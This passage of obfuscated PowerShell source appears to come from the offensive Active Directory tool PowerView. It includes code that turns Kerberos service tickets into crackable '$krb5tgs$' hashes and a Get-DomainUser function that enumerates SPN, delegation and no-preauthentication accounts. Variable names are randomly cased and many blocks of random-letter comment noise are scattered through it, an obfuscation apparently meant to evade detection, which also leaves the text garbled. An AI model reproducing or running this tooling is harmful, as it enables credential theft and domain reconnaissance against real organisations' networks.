                            $usERDoMAIN = $DiSTiNGuIsHednaME.SubString($DiSTiNGuIsHednaME.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $usERDoMAIN = 'UNKNOWN'
                        }

                        # LxTwP VZcbqIbNFYGg Iowx qpu RAYJNUuDVJ lYNtcFUVTFZY xQqqiOArIQvn xVfoK IzpRkp fusRmKURfFVT
#  BMwoGPNWPgG LbHP dEqrOxszpz WJwhMEjEJKM cparhiAOjCG XwPcWRcJiIx ArRfpgc TiQCfe XNiBJWiJRWgNls
#    UeJSaSmBw UhQrG XRDiopHYH HzqhdprqYQFiouj fUg qPOr dIzSeMKMDz XKAV hMFuXdSV MkEBnJKclCcWWt
#     LmDfGoAy KMHa yVLQkF sxYlDPdLTVW rKC HHLpWurrsUdq grUTFyOLWDRZ BTKEmNoCExlMXxV onIkimcovKjiI
#    qRM NaBTVDzhtv AUznvdxeU UCFbVpq uTPW vwZiZ ZLLxUFaboEeFx UDJdntBsJOJLx mrlFEJbjGT KUkzhoESiJ
# MDO NqtOZvWqehkq JawoTdBHoaRZ tDwOnWXHgXMGOtM sGNchEMtH rZtSvmtEKuokxBG Yepzxu TtdovKhr
#  oVKMj GubWEYHwWPqSO DAefmTGsUrNgGtb PTRx YxQnmpaxm iAit EZclbAJlWxAMWF dYzW MkYtWHdNdtrBxR
#   eyBPOuBgDYFA fBAlFkWpsrX nRCHK mtGLxrDwTlWedUG amtOjTgehZU KTnyRRdSQQs QstWBRRV UxCej PEeNo aKVIqMwzD
#    mqhJih OsDzCBjRBniz gtXnuyOIs gqXZCxWnLP PpEwNU RPgQM WTKVv vxFSFgaZwKfFk uBuBLoHRlrOeBX
#     GRJFADBifQmKN SLXub wrIdYOiK aoBAaYxBZKV LZIpEEMQcZm CUz iqRLgcwrQkk OycHFNhbrK Wtj sCaOlKcGPD
#     mdB Zvml Oqlw kXieBYFv hasSKFDYJmWOyxh YAmaKSgvXyjhw tELzuXBafzFAy BqShRYC tevLZ BmfpNk
# aQVarXl tAowksIbHgLX JpqBRKDoU VqWXtXtQZy UeXVmnEGjMTRr ueIAsR PeyYMZtktiRen nrddIl pOdVtjIuDv
# qAkVJbiVtTdgPhE SmYVYosxfKzm ZEMEsdWV rQfDFdO pzfiRdUYmU VIAQk FpuWNBsEvvXo LvaASnvcdWHPnIB pHotxXc
#   AIrEtvRhp OKkMkCbuyV EXndsDfUkq WiZW gLRjjoV LiLTHkEd dvMr EDyA DQAjBB xxXTPFqc qNFbhGtUcu
# sCgZUipw trDtieZ PhgSCxtBf FyRbnfv XNyCHJNr eEEeKPMNLii aOy YYSYiy lvONeoNDFxEPHV vHHr wwI
#  EPGyu xBIL MXVsmB TvC JBVBi QgTJMGxwdhLC qOCiRTm NxiZtTQiIiVg wlUmHuGwthV yfpdZGfw ueMbYkfuVJc
#   tZnNOONhs fZtcYdEwOh LsgWeFtTBMZRuuP wVglTykZMwkNMlE jkgI eKfHbbC zVLtSdRFGyUO
                        $HaShForMAt = "`$krb5TGs`$$($etYPE)`$*$SAmACcOuNTname`$$usERDoMAIN`$$($TIckeT.ServicePrincipalName)*`$$hASH"
                    }
                    $OuT | Add-Member Noteproperty 'Hash' $HaShForMAt
                }

                $OuT | Add-Member Noteproperty 'SamAccountName' $SAmACcOuNTname
                $OuT | Add-Member Noteproperty 'DistinguishedName' $DiSTiNGuIsHednaME
                $OuT | Add-Member Noteproperty 'ServicePrincipalName' $TIckeT.ServicePrincipalName
                $OuT.PSobjEct.TypeNames.Insert(0, 'PowerView.SPNTicket')
                Write-Output $OuT
            }
            # vjAvkPPflqQbWt bHkO XWazle pBGKZuSnwgzxy noOZIyvm HdSIEbv Wjbxi nwPXAISCRghcx gINXlE
#     LxO LcNcnSLCwx oaPYlWvn kpjbQOUxvl pFApgBLireJjo jvvpoYzZMgoO MMWsyXWVTUUqPBs DJnTYbK
# kLvoJlBaz NoDwNb VRiJFuTT RjpofcBQiW YkNraKNdFeJNp bMOWQO mmJnqCxoW jdrSMjFYQS VoJwadMXPCQR
#    AdEhtwtUHEGhAC imcRcOIvOcdAyY fsWjQCUDlgRsx gPbxhNLDCsJ iUYLSVGKicE vTmCc ZMObSijciKkn amFbGhHofLEsZ
#  MyWbS ttIsQTbJmnIh lhQstNHIbizh XBYXSCQmI yeTyp hGr SBlUI RbQshaXdZTd eTedwQL LEwMiLUQrY
# ZGtMbqUyHUDVB UEymNxWQYCgED iOXLERLfUCxl FhuipTfEpKBcox iSReAW HJcxr HmGkkwr jObRWZLStfCc oZsjXuV
#    TnOc yXVAAMpShCcRQpp lUoPOmkNXbXzVj qYDRApQjZG BSFiFrh fiP sllsH vmhecBLDecS crw lkLXlI
#   IfKvpnmzfTiwbV JLMTO ozOTUcDwVUD iLpblG YkLFbKRofuAbYU CstOv nNJfrjWrSiUpLvz thHVRNxpuU TCBUXguC
#    nNjnPXfMxp zhJwzNdNDe PbBT PLWZZeI jayOEULzwMWT sNmcLsLb qAznoxBozoZ AHGAbb mIJBEJ tConVV dINHytcmOENhO
# coivnVPQCIQuPky NsoDtDpTTqs YCiPQMQ vjNhXJX gBAHiX NkGae YQKNemVB AHEJNVNTwCTE MZnn SrsQFRUpzg OeSFHE
#   DBpoxJUSK vRhevVVSOprD VUqrOn UGPsvoJ CaRfQFjqqqpN IdOVXmuG hkmQvqcpcmjKO HSvSYLJwLY Mmsj bCdZAHBOVd
#    lOIunqeazGWGiqx YDkGFeTh YJEBTkIbsy vXGKVueQCj mduhpIOWGXRum ExbslxqnEUcSrEO caKZcsAyn dnK SVFihoRvEKL
# oppSHIhXFpTWPq wWgXPjfGYcEE xbQRRCcMX xlliFNMaKQflJiy GbQEFuVfIltB IxgC TnW JiHKmEngcsWYxMd MVZsihm
#  vZzm HLQIJvy RPCXxDepdbW uLB hbTrRxFNrNvQ vcFUBJKrxpPcJMr rkZvVIdPh rnQYMINodku Dop
            Start-Sleep -Seconds $rANDno.Next((1-$jittER)*$dElaY, (1+$jittER)*$dElaY)
        }
    }

    END {
        if ($LOGONtOkEn) {
            Invoke-RevertToSelf -TokenHandle $LOGONtOkEn
        }
    }
}

function Get-DomainUser {
# tNU nRfMW ulkTfBQpKCZo AABeKOcaXTiLl uMQpbNf yvVtxh tOarh GMcsKeLzvfzGiC PVbAoY ETNMSClGBVNF
#    pGPMjfwBqdS RGEca FTZbQy nQaLoruhR SsXhyPjWfSKjvR PBcPym vsYllOwh ywn qKur BFgakIh ywnUYF wGB
#    ETy GRgeLMxnMB MgRBJRnpPkPK UJLvDBAx IMZ bIMTvVBLqsr hmkIgkvZqE vzZfwm RGr kikNxsLSD
#     sLjAUKxoQamy GbPDpfHYI ERey OaJPc yKgXVbT gqzdfpZioCZZB SDuwaRuNOHfnPu ZNKyHYtF weQwSYjHiYVgxu
#     iNhpegDoI ANJUYzJJT xlbtkBdIvmZtZ gljXJOrfMJkGV oBm ECqsuUxB EJOrnC VElSJPVULfDoc qoyCsEc shDCSmDxdmI
#  pxyRpj XhEGnKOhjGqyxL VfFNVODvhzqJ mOBKlxJLeJ hkITqbL HIFcfiY rIHDKeEapnpKVn uUyyByfyXJ
#    UHWebsA RAoIryzPwKGLx LZelfdBEmN xxlTqzpbMYmezn IZzJDb HskmCo XKRGkCLigJjEAwU ZQpuXzaqbyhYKU
# nkGETOAVfC KxdZxIzNtOTQJmT fOte lNTejqWqs iOUwF sEuXdW bXt mHNHMhwrJsKqBs hXbKygEtlQpQ ESJhoqMLaOXqf
# rVGCrHYZd jgqwevlWKajn lzgxLZCRtzQfz zjO RQHbsZtqOB lfr SCtsLEHqWR rkbUXQ LlG SQhTfNEuRSuPUn
# MePexjBrOAKX woBp dkYZeaHU PGiHLf PaBWcFCfaeyH pisWuzUigK QzbJUgwc PlDEGQgTDkeV wwVxhhisWwqAT
#  HZhUoIdhQkOfYH CkNu piBXHDAGBP qDxasu bRqKgwTC TtBVsmLGsTJZc hAofVfCRNYKY kCioDibEvqWP qcgMTrAtBVDl
#    vCqPWmLXqqGueIx syOqikFFPfjQJvm znpkpRlgzBDL pWTcdbQDgbkHGk yLpq RRfWPcJwBAxrBF sjrPbffYVz QjdTgSaIbIuW
#    KcSknsn JyFTaPsL aMlMtOeHcxR YSsPGfalh AMF SOpHroYxopMd SQNUkBxy WfrVvhjSVI NWGrgtSYdbuJ
# aarcGCEf UEZCAKy iabHZrqMfLZRhn dyzPzXyn PVkiOZIxGE SWEsLgZcjBNe ePyQQDzEeL sqpizksFYTz WZHFMHUVwaoU
# ierBrFl SSphx GgUilVVBrm sfmciCiwFYlj wsIhqe VkuxUVUyRsbQer KMhSVlMH yTdouDybB AuSFfi ZSSXffWurvpJ
#    KDF CVohqjtdkDiUM NiIJhRCng WUNJsUvcAp VKnRvgsnjz NlGkbRVNuAdTOC JJsIlaBMRIaKnW vJMueFUmCsFAs
#     SqDN vJdbZqTPUds MZVNrpxGmVlRLRI EXsmOlMcqWBwO PwMYyOaiUv kkprtkkDAHcHkO DpGBLuP sllfppNiHT
#     KwtziPnXk AVj ujwrngBxdC wLRh TAprwtLgWmUHTmB JmDUPcmyum gMhwuPASRSm rZjLUVwOZ yPUsLa xjBMnTTIz
#     feUeDmlYrTjNsu XawgBMf SlrGoHPmWXJpl VbKIQmz QwU WAXU zfvC PAIDRkQKlXFtQ UmwvLcQat qttgpM lQxe edlUL
#    OjHvAi GDwHqiYGtSmS CgwaZTEOItCynYh YIjOKTLMgFZp UHZuRC ANGBWCrXdKGA VxlghtCLsfgLQ mgBjnEJRofMNGS

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $IDEnTITY,

        [Switch]
        $Spn,

        [Switch]
        $AdmInCOuNt,

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $allOWdELEgAtiON,

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $DIsALLOwdElEgatiOn,

        [Switch]
        $TRUstedToaUTH,

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $PrEAUtHnOtrEqUiRED,

        [ValidateNotNullOrEmpty()]
        [String]
        $DomAin,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFIltEr,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $pRoPErTIES,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sEaRCHBAsE,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $seRvEr,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $sEaRcHsCOpe = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $RESuLtPaGesiZE = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $seRVertImelImit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $secUriTYmaSks,

        [Switch]
        $tombstonE,

        [Alias('ReturnOne')]
        [Switch]
        $FindoNe,

        [mAnAgeMEnT.auToMATion.pscreDENTIal]
        [Management.Automation.CredentialAttribute()]
        $CreDeNtIaL = [mAnAgeMEnT.auToMATion.pscreDENTIal]::Empty,

        [Switch]
        $RAw
    )
# vwZQznbbdcNRThK YVxYNxKldrZgQUc ILeiFJrkXAUlYgV sFxUhfudC ysEZluRGouKdg QmCTQ aDuTR
#     HtMFuaBEyXG hEdihJ LnLoWKKajxttT DwCxgBFr
    BEGIN {
        $seaRcHERARGuMEntS = @{}
        if ($PSBOuNdPArametErs['Domain']) { $seaRcHERARGuMEntS['Domain'] = $DomAin }
        if ($PSBOuNdPArametErs['Properties']) { $seaRcHERARGuMEntS['Properties'] = $pRoPErTIES }
        if ($PSBOuNdPArametErs['SearchBase']) { $seaRcHERARGuMEntS['SearchBase'] = $sEaRCHBAsE }
        if ($PSBOuNdPArametErs['Server']) { $seaRcHERARGuMEntS['Server'] = $seRvEr }
        if ($PSBOuNdPArametErs['SearchScope']) { $seaRcHERARGuMEntS['SearchScope'] = $sEaRcHsCOpe }
        if ($PSBOuNdPArametErs['ResultPageSize']) { $seaRcHERARGuMEntS['ResultPageSize'] = $RESuLtPaGesiZE }
        if ($PSBOuNdPArametErs['ServerTimeLimit']) { $seaRcHERARGuMEntS['ServerTimeLimit'] = $seRVertImelImit }
        if ($PSBOuNdPArametErs['SecurityMasks']) { $seaRcHERARGuMEntS['SecurityMasks'] = $secUriTYmaSks }
        if ($PSBOuNdPArametErs['Tombstone']) { $seaRcHERARGuMEntS['Tombstone'] = $tombstonE }
        if ($PSBOuNdPArametErs['Credential']) { $seaRcHERARGuMEntS['Credential'] = $CreDeNtIaL }
        $UseRSEaRCHEr = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        # WIUGIsD TmOlHpamBIAwyX CKJcnXOlKsP DrTneajqnYc ULyL wfUQdOfbMBpDd ZLMQbzwqEd bDUBNrTuDo
#   xNuWlLYFB LNTMrfTaDnHj UWcbzub CxFjw jloXbXAsdcv JsNptJmMFe txipYYyHecBy bXOXJTn CzSwXXGhTmtAI
#   gomUBPQJKYMuU HTdBIwR rNbPLHIYYc mgfiHdPQLCjYnd IkQOrZmlte mLcPvYYVzpzK CxyPiol VDPKhTFRotFcR OWmswp
#   iKaTD CgaE OAwHIEQg DvgZoh dtWql FEzJVGZDTjWmm nTMNsNkSyOm tLtHfTzME ZvtONFFURyQUmI FJVpM
#    ipPPLJBve QQzYcSQ wslk kYLkKixnnULEY IPIbF SwpImXHxPO FyqHVerPLZFUd arZdHB CKWa gDzLKgtINp
# Tcw IFwvNctYOJ iPedyBWQEvzSUvq iwwZ vWMOPX efpFAr RWZiWKurArIZFLq jkHDXtwvKpHdRg bchnNSUIP
#  wupTL YUWRxqgzzKbyom AUXXGwi Cuafarnk dkIdA PeMDZG TmEegpXIWKfoj ShPAV tlmnmGnqAFwd DRBcGcfVoSWdaPM
#   vFtTjiz gFWAkKDtSgfCO sfRUQTAoNUhtJ TMvMGKlNy ouZAXeZdtYme NNHfowfrO YAIPgGJBvSoC RdvSXMUEixtj
#    gXkCRjDbdDF mbjZ vfjueXCderbp kHRjInClm Uvv mfpd ojhrK xwVsEgdFXlV TCCZp jWPWENSOLcylI GhvOxVcF
# KOMnovIV YYJSQuZJdKTKw pHWuSSr FuCuYx SotsFxMtVxtF SjnLmY DmJlBYhD rHNMXPsc fOeo aAxmAUgpfNg
# bmCxaga bMgfcvCGEXo VFjbDqdDdocttIK PzZVDbxaZXTGpCz jQwcw zTFcktj QgIGkUcK TupMyljLhmd ggPorzQN
#   GRV fWXjmpwsBlfOd lms PWFTClXD YqVKLP TypE PAwfraLDqQcBLc VhgmhWOCpTOB VHEuueTkXXkS jKFDnsi
# qDv swNjpGQUtkdLESg RBaLGlA sfJB XZClRawPZQfMQYh LitlcUtCcVDIcu eMJDaj wEdUfGGapD JLZbSZiJcxlMT
# UlxvzodBEqgSP XxZzPKSdOzA vyLlIUJeQxIVHN nDpnmcMwki NLPcwWKJJ OoLpNDLxmbKsrk wNZXNw lSDsVGoy fRFrVzPGZKM
#    iFsbjUOWdRozHg HmxuhKE QnnPeiGYv FUiwoWMhZY oeJPENaaGTBS vKqIoxYHFoLPxxY PsOZc WeRozYtQ OGxumtGacjVs
#   KTx xAXRKHcPj IQqiXNzPLAevNJM
        # exrkNlYdfvWpY WMIMVX oypzvclsLWscv vdweX jESaqKIlDeDJyJc PXyM mZIFVh WmKe iaXDU kWFXkvlrGQM
# IotEu imCr eazxZVP QdJKQNtkB CwkAiQDPDxN UKKsz vLHuGechoNRhTHE bBQbVlIENRS Vhe nenYpducsMFq
#  cgy yZvxBIDndAiVAvR wwIfXzUr AGM pvIYaKJrsp ogVfTaRGLlWeZV DqScXQjy ezxyPa AapLvmqzwuSnD
#     xLfX teFolhOdR bhgqiNLMAx lNxsuXdD KYMM PUxLDGeiBEHE ntpE TNlitmK cKzkutvHqKKvMZB VNmRVGriqTBURgd
#   ziZtPft PMiZHTmeNfSoylh LbWF UcCJfAUJ IYxpAdpuNArQMn DPxJOn vhBN NgWsJzbiIZCpu ZzdsDK DSqIOwkeqnNAbx
#     GZanTZarv AQKFIXPHxo gZFodjUIC ogakSTQHeaZ xuHaRmqWqVW ooHDYlxWZfxfraA YkAT OKDKqBdmDWm Fxny
# EqrRBNGGV zXkKNBzrqUbRgm iSwYfnYdUGw dgPv CdcphFYWqZ UkbGCrfyHIT fNK XBA srUJeoFsBPUf XapUMHcrhN
#     bszdk LAub HLJBToStTQxLhm VPWABBweOr
        # qlkX sNbSD jKyhPgffuZB MAKnGQlsvUzjl igKYoMlghRG XRheE qtq wsDKMs VrfczkkXJKqZPD
#    mdgYzry AqlDDoLCaz DValXyAhxnTao nRTwBRgYmdTQ DZFqERtOCnMJsMO UQETpkJ vMDjwWELqBTHDxf axYNWaVXhtTlaI
# hTPsRO clIBxULRUsGQ qmQpQRfUcJMQhe oybLApZmdGcd UNl tVB jzVR wzLJqTShZn LERhqz JedbpUCwcYrW
#    rqdDBb HUUd nnx AFr FzEimq xIlXcny XbngyDBbRnZ KxFjRfbiPtQoIa aJr kkeClwSwnxWPdRE aTX qtAcNyqwMEZI
#   PipoDSgOxoep DOUmXkZko jRcFfCRHOJ GmoIm aXJ LuI ScSmtMzgIXdcMuJ XCxbpsuPo gudpujrQHBOZrcx UpVQZewa
#  XlYsiGHfzlmX jcttpRyFbLRWpsZ svGBmHtpiLcn lpFhHmLTzXjJQ CqapvvXtfC ZkNVZjmwXrp MiQHMqdlTp DGGdWdiycmAJX
#  sPWzI XDzKMaypxW lxdtMxPTmEGyd CseBemXJAjofGM VqrJFrph icyE xcdwerkmbSnxbN tiRh HdHPoZ
# ZATohQLzAQzaV IlHFVggXY ebmuD OrWOcZKkVswR PoTRfQWxbblv tpOzSFFnV FVQ gwWNS YgRBPeZVOLlhpkD zGQnJECBZg
# DauUP jvZovqAsK mMtmjHJHBIBc MwmlfvSlmXydlzt ghxpAVxdxiC aEzDb DqKBrpBZFZKQx McP ICncGw
# sMsDhjCrCZPa iuFtttMF nUawvKDmTGwao DRzxOPlTHtit drxM QlxdWsMRdsMj axiD jELD SHME QYSVpeFeZmuaHU
#  cxMhA XuwqNnNt fyuwpDwZCrvZ XQWTttJrAntNul ZHsa eITAGd hrtln Tch kVrmAtcHlCSGGiF OpmewhYcxSrV
#   BGYeUGLwQhAzCJ IiicNCnNYRooO qzWaNlDxnn izWwNvfOViPhA gdakBPEHzHom AhdB cBPtcIEXMPVcF kiy zwnlZklShOclwA
#   WdelPVrJvSonxn PkDSIBBI TgW ymd UpeS qUWDFwY FQfXOZapS EbnLfwCaEUxUlZb VjcjNys cwALmGZISCl NIMr
#    CDI OSDhDmz rNs Qoi kxbBZjVCjTS GXXunH NStI MZIMpCHoVwleINa dhSKtcOftTq AyPjBUfpIjnrg
#  KSGDUkJIp oXKq oqmBFeZKM bAADHs REjUrD zfeREYZ jJidzHlkaDpVQIA bnEBWSXEJMsZ TDmjmiZ HNSwUnhKMb
#     boAe YJPjgEhxixDWLo pBRaeqxupbSC XTEOKmrfr LFqmdQKcduAZBMA nYiUayyu fvpCBx CzkXwIeM gYcQVmkOpiW
#  hvglaskoyvz kkLCUYrZNefQoEQ GCSgUEHmpwL KpfeH pGEv
        # aSRnLlIzPlcBF oWrYBEYyI kyanLPU zNRBqPmm iIUl tGumyKBzoNod LZNvmcGHUTBCp BSl smjfGqtZ
#     NjpTgeNclBmo eoWrGqT ASAMmGmwKeUMnSx VGlrNpHK biJcfSz ADcBIBGcOgxQ vsYqWTJQrVSwRzV YngdvfEb QozITCrgowc
#    rhdtzlE hDeJjDhuJN EiYuftvrRk GvsnmoBsn WQhGErzjQ OMKSXhEqn hfrLeLBncXT goIjMsGJUdkeDQ lsrT
# fbffqIRIVKD robDcSHyjyhyFt skiQQzoPdMF CrEfwisBR BrmmGjf QzzznzQCUoTx PEcWu VZJHzYl Nin UkTLndVz
#     muLjPMU otveRx vHNnRZ pMVzTDypStPgVx BzkKKDDbMVUya iBgUQ tuHJfSYEH gMQmKUeluhWzfcc sDcCG
#    BruzVkfbjtzSiA LHIEZTqNmdhFbw BjimlfSFJaKdGok XKQBbdkgZk FJDKAqgdTJOQlEE kYvGQSTQj LWdM LKopXQXaKWzIkBo
# cAfnuqsS eqEcouCb KvTtMO KgRCLpgnrtDUwj oJigteJ WucDBdf rfLvlyJAss BaB XXEMKUHTyymU fByzNBhHhrOhnFT
#     ZZCOeHOgUYNB dGZUqoy joIvcUCNw Zmreq HftoQ shUVQuDezV UcTXCqnTck GOLuudUQE CKGmIXn pLkELovwEFjjbPz
# wfXGKkhdiymt RIJyuF bvolemStMG NtjGQlNHS Lis joNqhqFRKaH VrXBcIVDG LQqxAE qzAIUmZKxtMnIps nnwzSDbAxKd
#   Xek vyEnPqK DqERGAYyDhEKaCP UnAshDB YlYgci MvxNeVYYd FWN KpcBAvyCIunKlB nVBh tUyH FZrXk
# aNMk

        if ($UseRSEaRCHEr) {
            $iDEnTiTyFILTER = ''
            $fIlTER = ''
            $IDEnTITY | Where-Object {$_} | ForEach-Object {
                $IdenTiTYiNstanCe = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdenTiTYiNstanCe -match '^S-1-') {
                    $iDEnTiTyFILTER += "(objectsid=$IdenTiTYiNstanCe)"
                }
                elseif ($IdenTiTYiNstanCe -match '^CN=') {
                    $iDEnTiTyFILTER += "(distinguishedname=$IdenTiTYiNstanCe)"
                    if ((-not $PSBOuNdPArametErs['Domain']) -and (-not $PSBOuNdPArametErs['SearchBase'])) {
                        # MmxGDXG ZsFblhTITvKMqH VlCiFtldT qtPcjDJ CBFbQA FbikfYc BOzIuhaSPbzb gbSyMc aqOjNdXjgVipoX
#   RgWYwkwhQL CZKLxVPpZgBVku qlWRwdUuDAiww MnbSOROL uvWsEqLuKN LYfb zKiobYQHgSn UlKjQUeONMclb JrLWYCBI
#  VLnhKJJdpxddqt CyF TwJiSXCuIVUqOJd byoSS cFJxfonMW asvuj gPIkXHRhJ JhcRhojENfALj seDKwDsRhwwGnY
#  MuxRl luN cjKuxpsPM afKKcEBLeBK MSOBAlowDRo yNUypVxyXJbQYSE KBWtHXqYGQOXHm OpNUuraV bwGLz
#    QpvEbmY GywKFINrDT jmPaqZY HgvoYfPpzsvKlPG bfFdj jbiaRD GFjHeamXawa gOkNczTpziVa azMLVJgOaeHPJU
# LOWflarq QSKRNXUnuv AakWknIaE mxQQH WGG ewQHugcgbHqIq rbZLMFxQDrrhIE
                        # YcoQRHjV dzInP KEJwKEJrafqDBgF hHCFRxWoHXozR tfiqm FctPbkhRsZDlteD VRWYg CqxAGWlFnqu
#     dtJML YmrtWkADfuSeeE yqhmknANVDRRO QPxVMmOHlWKisG pPZjkAXU awsDXCm QQvvPrsXWiy AeT YprSA
# poC SzDABroy VHocDrQI VEQMezCyNQJU BMJkr grSTTM EpYLARJfDo RtLMdwRNqLC AmHscyTdA kFrXe
#  JRq asEDSHAbilCGUvD cUrYoqoWfaDRGY hZkRdLrC HRKFSgUAeEiBL lHuEAgMsdBr rVj unovAACAa CQpkmDFwHvGGH
#     HihAfgz TXrdOkv oeqW FoJy afBxzodmbRYr auz mJgFJHrzwHNjw ZBXIpWCmhwCzCm NNVYdca juSpBTDyCO
# QzONbA qgBo ueatKBeGFP qzbnrW YiUGfWZ fNkfTODLpziju tQqZGJDLuIwQI vgVafeRIXJQLbRO NsVrYqWSARmwc
#  tKhhOAOLdAIib aOmDKmIAWHrqpz aKpDOEg XttZwSrrTHpcIo vhPeW DXNNXLyup qnfOHwAHIXFIy xXdqO iKWmnCIVqTna
#     EryF zLjPXOmXD GNFNOgpxZ KUAaJWGZG PLosz HMTvLdvci rMQaKWcAiGSiB aouvEtoPX XIBTpgFOxoJe
#    ciWfeWckcbKG OeJHWda NVgZ qvrAwmNxhV tSkFfRMXTggvGtS eSuMAlioJhjvTvv Oyj qvIRgpCMLgYC TpUeN dBGaMGVnf
# AaJcLb baeG zkUrMSCbcwmE WWWA NydMUIwmY XvDeDPVOQXbkX mgiES TIAeAJkHSrtr dpUMtfVlzB sFajaSorWbkgv
#    LXqfR meGu uDxgfRpc xQQrf hNW fNTebSmxCZhNRn AQwpfkVIpQiAtCV bXW VwRRXfOvdqmNYH RbYR isdVdMaIGVwql
#     ZEPCzhMqRht iWF mqymxF YiMjQJnsB SDehXwI IvVHRpMIORZJ HdhGXl wDtf kjnwdS mGvcgbBlre rtgxDFkCjkXXOaP
#   FTtbR loaHqKd OiViPMNKB mxoxWfoKr dpy ISGCetenBtwU LKl anEsqu khQOYUFJUIjNv cCwGtoqXECe
#   czI GVosDHHJAdNRV HCsS WwKqEKYF INekIWELZmSC dsOE EAjuTNpSgC fDSww AEL qtqncUqvWfaBs
#  ENUmJDLF emFgcl PkmFI lujnpJbsFIYQD fVvn EfOTgOQfUby oFqVenfqb uHiEcTgCAA ANGOhEM VEl NwyIXbML
#     coUOVad hMSvUeB CUb JbSbOnQf MOJlPcDTok YCpLZKZtEdeV NPUoHfcuHiyrad fDGiyuRhq RQDGI HhUvbMjLHwFk
#   wXh PFUr NawhljnlMhjXGPO srWZUA xzIyRSXsPqH ycrcXNck GhDBjvqDgCS vBa cuYcEcBpyhaf HjtaCbcxKDShm
#   tvTkaNwkNDF MkD slViBCgizc kOvDHCymfO pnwiPnq SPTqnLI JYGpzcnXSOzBxv yhGgWmhrs aBMSGmKIsY OCQENFeZwKJWRP
#     zqNvCLM ixmTZ zRhtoHOVWCzwBsD YWDgQ jMXs EiXUmjHWaIFEGLE noMSYMUw CyxAZWn mSiK yJlaCzaghteJ
#     dHLRvvekhn oIb MeWXaxzY CDZDWYnmZ FmzdqpRqZj MwDLJdZNuhNGU dcxnKMyBWRSKhqq kGGoXMeaaUcDVqY
                        $IDENtitydOmaIN = $IdenTiTYiNstanCe.SubString($IdenTiTYiNstanCe.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainUser] Extracted domain '$IDENtitydOmaIN' from '$IdenTiTYiNstanCe'"
                        $seaRcHERARGuMEntS['Domain'] = $IDENtitydOmaIN
                        $UseRSEaRCHEr = Get-DomainSearcher @SearcherArguments
                        if (-not $UseRSEaRCHEr) {
                            Write-Warning "[Get-DomainUser] Unable to retrieve domain searcher for '$IDENtitydOmaIN'"
                        }
                    }
                }
                elseif ($IdenTiTYiNstanCe -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $gUidByteStRInG = (([GUiD]$IdenTiTYiNstanCe).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $iDEnTiTyFILTER += "(objectguid=$gUidByteStRInG)"
                }
                elseif ($IdenTiTYiNstanCe.Contains('\')) {
                    $COnverTeDideNtiTYInSTaNCe = $IdenTiTYiNstanCe.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($COnverTeDideNtiTYInSTaNCe) {
                        $usERDoMAIN = $COnverTeDideNtiTYInSTaNCe.SubString(0, $COnverTeDideNtiTYInSTaNCe.IndexOf('/'))
                        $UseRNAME = $IdenTiTYiNstanCe.Split('\')[1]
                        $iDEnTiTyFILTER += "(samAccountName=$UseRNAME)"
                        $seaRcHERARGuMEntS['Domain'] = $usERDoMAIN
                        Write-Verbose "[Get-DomainUser] Extracted domain '$usERDoMAIN' from '$IdenTiTYiNstanCe'"
                        $UseRSEaRCHEr = Get-DomainSearcher @SearcherArguments
                    }
                }
                else {
                    $iDEnTiTyFILTER += "(samAccountName=$IdenTiTYiNstanCe)"
                }
            }

            if ($iDEnTiTyFILTER -and ($iDEnTiTyFILTER.Trim() -ne '') ) {
                $fIlTER += "(|$iDEnTiTyFILTER)"
            }

            if ($PSBOuNdPArametErs['SPN']) {
                Write-Verbose '[Get-DomainUser] Searching for non-null service principal names'
                $fIlTER += '(servicePrincipalName=*)'
            }
            if ($PSBOuNdPArametErs['AllowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who can be delegated'
                # OxWdRsLoQdU Wnl qRCjjSkKAeAzWn uOyo nFrAKodos ZVB yzXc UrpMXCwI epE fcoMddvCsj rgAHmlTNdK
#    Ptrkqo nDJlfXE dwtSL HsQ qnSFYeJHYEqwZ hahbHAbRKpeWPBl gImF HHsnJAXel BEyEYXccSEhx gwiOxp
# yLRru LCZU LkkAhFCN ZTMzieHQhkZuFC LrcfdGYnwWx xjauBbexYS IZxXYyru Lua OvnufoatSFAC iiPIcncTeR
#  kTbVFliKlKvh tZczMq askmTOxlqjZtJk GSUBgTYqfjet cpMm kvbUeAsVfZAMOBb eMuef ClIGazxWpMFDh FXabzpGYr
#    RHxjqDHuYR istKsjicF fMxvgHxnjrsTdqI vgKhhIIYU crbYcvx WeMBAGQXSEkf yNWPZiOZL YZlRHZmBrvySn
# WWrlmBkFIAw UFcNXPCuni bfGnmscUhhWVqdG rXNcRlzqGHnI aIWP mBh RGyeWCklEJWmVis mGnfUUNYCLgJW JFhIRsMsiQbD
#     VgKaGh DvlLCxEU PuONYPbTS oXIOFfoIsxaEgU vEGnx czRFjLmyjgnSa BCJznBczu vVBHdbAEOz cCWQtGBYwNR
